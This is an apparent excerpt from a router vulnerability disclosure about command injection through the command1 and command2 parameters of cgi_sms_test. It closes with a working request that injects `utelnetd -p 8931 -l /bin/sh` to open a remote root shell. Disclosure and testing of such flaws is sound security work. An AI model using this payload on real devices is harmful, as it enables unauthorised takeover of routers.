...
In `cgi_sms_test` function, `command1、command2` is directly passed by the attacker, so we can control the `command1、command2` to attack the OS.
...
We set `command1` as **`utelnetd -p 8931 -l /bin/sh`** , and the router will excute it,such as:
...
cmd=cgi_sms_test&command1=send_sms`utelnetd -p 8931 -l /bin/sh`&command2=
```
